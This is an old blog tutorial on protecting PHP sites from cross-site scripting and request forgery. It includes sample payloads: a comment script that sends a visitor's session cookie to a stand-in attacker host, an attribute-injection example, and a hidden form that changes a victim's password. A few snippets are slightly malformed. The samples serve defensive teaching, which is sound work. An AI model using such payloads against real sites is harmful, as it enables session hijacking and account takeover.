title: Securing Your PHP Code - XSS
date: 2008-04-06 02:03
excerpt: 
categories: javascript, php, programming

Today I'm going to start a three part series looking at security issues affecting web developers. The specifics apply to PHP developers, but the general concepts carry across all technologies.

Any significant website is going to consist of three core layers: the client side code (HTML and JavaScript), server code (PHP) and a storage layer (MySQL). As a developer you should be aware of the security implications of each layer of technology and how you can best secure your code.

<!--more-->

## What is an XSS Attack?

This post is going to focuse on JavaScript and HTML. You might think that the HTML on your site  is fairly benign. Does it matter if the HTML doesn't come out exactly the way you planned? Actually, it does. [Cross-Site Scripting (XSS)](http://en.wikipedia.org/wiki/XSS) is the terms given to security vulnerabilities that are exploited through client site scripting.

## Attack Types

XSS attacks fall into two categories: persistent and non-persistent. A persistent attack is one in which the attacker permanently modifies your site, just like the example below. Any user that loads the vulnerable page will be affected. A non-persistent attack is a temporary modification to the page, for example when a page prints out a variable passed to it through the query string. A non-persistent attack usually relies on some kind of social aspect from the attackers to entice the victim to visit a specially crafted URL.

Non-persistent attacks may also take advantage of holes in your JavaScript to write output to the page.

## XSS Example

A simple persistent XSS session hijack attack might take the following form.

*   You accept user input into a comment field. This is output straight to the page with no filtering.
*   Malicious user Alice sends the following comment

```html
Great Work!
<script>document.write('![](http://malicious-site.com/capture/)');</script>
```

*   This is accepted by your site and pasted into the comments.
*   One of your members, Bob, visits the comment page while logged in.
*   His browser parses the malicious script and adds the invisible image tag to the page.
*   His browser then requests the URL of the image: http://malicious-site.com/capture/PHPSESSID=3D3c2542747972f9a08b8759eafd079d7b
*   Alice's server logs Bob's session cookie.
*   Alice can now use the same session cookie on our site and you'll think she's logged in as Bob.
This is a simple session hijacking attack. You could no-doubt patch this vulnerability, but there are a whole range of vectors that malicious users can use to attack your site. You need to focus on your security from a broad perspective and make sure that you have covered absolutely every angle. It only takes one hole to circumvent all your defenses.

## Escaping Data

The one rule to stoping attacks is simple: you need to stop trusting your users' input. Every single piece of information you receive should be trusted as suspect. This goes beyond your usually $_POST and $_GET variables to include the following.

*   $_GET
*   $_POST
*   $_FILES
*   $_COOKIES
*   $_SERVER (variables like 'REFERRER_URI' or  'USER_AGENT' are sent by the user - some attackers have been known to [send bad referrer data](http://lwn.net/2001/1108/a/webalizer.php3) so that they can exploit admin interfaces that show referrer information).
*   Data from the DB (another developer may plug in a new data source at some stage, so you cannot ever assume that database data is escaped).
*   Anything retrieved remotely, such as a RSS feeds.
That is a lot of data to sanitize. You might think that you can filter all incoming data but that's going to lead to complications. What if you decide you need to store data from an incoming RSS feed in your DB? When you read from the datadase you'll have already escaped it, and risk escaping it again when you read it back out. You will end up with a mass of code for escaping and un-escaping. On a project with multiple developers it will become difficult to know whether the data a block of code is dealing with is sanitized or not. The simplest solution for escaping your data is to assume that **all** data is unsafe and escape it at the last possible moment; when printing it out to a HTML page.

What we need is a function that will ensure our data is never interpreted as HTML by the client's browser. This is given to use in the form of PHP's `[htmlspecialchars](http://www.php.net/htmlspecialchars)`. This function will replace any quote, angled bracket or ampersand with its HTML entity. `&lt;script&gt;` becomes `&amp;lt;script&amp;gt;`. Once you have sanitized your data then you've just stopped a large number of possible attacks.

**Note:** make sure you quote all HTML attributes, especially if you are using (escaped) user input in them.

```php
<img src=foobar.gif alt=<?php echo htmlentities($userTitle);?> />
```
Could easily turn into

```html
<img src=foobar.gif alt= onclick=eval(/* some evil code*/) />
```

If you want to remove HTML tags rather than escape them then use `[striptags](http://www.php.net/striptags)`. I prefer to use `htmlspecialchars` because it won't lead to accidentally data loss, and also indicates to users who attempt to use HTML in a legitimate manor that HTML is not accepted.

## Allowing Some HTML

At some stage you are going to encounter a situation where you want to allow users to post a limited subset of HTML. I'd suggest that you save yourself a lot of trouble - don't ever try and filter the HTML yourself. Parsing HTML (especially badly written HTML) is an extremely hard task to do well. Regexes aren't going to cut it. [HTML Purifier](http://htmlpurifier.org/) seems to be the best package out there for PHP developers.

## Cross Site Request Forgeries

CSRF is a separate class of attack which is not technically an XSS attack, but is still closely related. In this attack the attacker creates specially crafted POST requests that they execute on the users browser without the user being aware. On third-party-site.com an attacker inserts the following code.

```html
<form action="http://www.your-site.com/account/set_password.php" method="post" id="evilForm">
	<input type="hidden" name="password" value="newpass" />
</form>
<script>document.getElementById('b).submit();</script>
```

Your site will receive an apparently valid POST request to reset the user's password. Because the request is sent from the victim's browser (without them knowing) it will contain a valid cookie. You need to have some way of filtering out these bogus requests from legitimate ones.

The "[Samy is my Hero](http://namb.la/popular/)" MySpace worm used a MySpace XSS hole and CSRF to spread.

If you are modifying data through GET requests then you have an even bigger problem. An attacker could post a link on your own site to a malicious URL: e.g. `http://www.your-site.com/blog/delete?id=1`	. No filtering is going to remove this URL because it is perfectly legitimate. Do not ever allow users to modify anything with a GET request.

## Preventing Bogus Requests

There are a few things you can do to prevent rogue POST requests on your site. A malicious website can have a hidden form that submits to your site, but no third-party site can ever read the DOM structure of your site through the victim's browser.
Many sites take advantage of this security restriction by introducing a two step process for any form data.

1.  User performs a GET on `delete.php`. This page does not modify any data.
2.  Site creates a unique token and adds it to the user's session.
3.  Site returns a page containing a POST form pointing to `delete_process.php`.
4.  The user submits the form.
5.  `delete_process.php` does the actual deletion only if the user has performed a POST request and the request includes the token generated in step 2.
6.  For good practice the server should redirect the user to a page that confirms their action (this is known as the [Post/Redirect/Get pattern](http://en.wikipedia.org/wiki/Post/Redirect/Get))
This method will thwart a malicious POST coming from the third party site, as the third part can never read the secret token we generate, and therefore their request will be rejected.

At the time of the "Samy" worm MySpace was actually implementing the two-step process described above. However, because the attacker had discovered an XSS hole in MySpace, he was able to spread the worm from within the MySpace.com domain and could use XMLHTTPRequests to read the unique token.

Note: You may think that checking referrer values is a good way to stop bogus requests. Unfortunately there have also been known vulnerabilities which allow an attacker to spoof referrer headers. In addition to this, many users browse with referrers turned off or deliberately set to an incorrect value.

## Watch Your Subdomains

It is common for many third-part scripts like WordPress or PHPBB to be vulnerable to XSS attacks. You may think that by hosting the package on a separate subdomain (e.g. forum.your-site.com) would keep you safe but an attacker can use JavaScript's `document.domain` setting to make XMLHTTPRequests and read cookies from your top level domain (e.g. "your-site.com"). However, they will not be able to attack any other subdomains. If you main site is located at www.your-site.com and cookies are set to be readable to ".www.your-site.com" then your main site will be safe.

## HTTP Only Cookies

Another promising candidate in the fight against XSS attacks is the [HTTP only cookie](http://msdn2.microsoft.com/en-us/library/ms533046.aspx), a proprietary extension created by Microsoft that would stop scripts from reading cookies that should only be read by the server.

## Final Thoughts

Be careful with your JavaScript, you could wind up undoing all the careful work you did in your server side code, just as [BugZilla](https://bugzilla.mozilla.org/show_bug.cgi?id=272620) did.

Pick a content encoding and stick to it. This has even [caught out Google](http://shiflett.org/blog/2005/dec/googles-xss-vulnerability). Use the same character encoding in your HTML meta tags as you pass to `htmlspecialchars`. UTF-8 is always a safe bet.

## Other articles in this series

*   [Securing Your PHP Code - Server Security](../securing-your-php-code-server-security/)
*   [Securing Your PHP Code - Databases](../securing-your-php-code-databases/)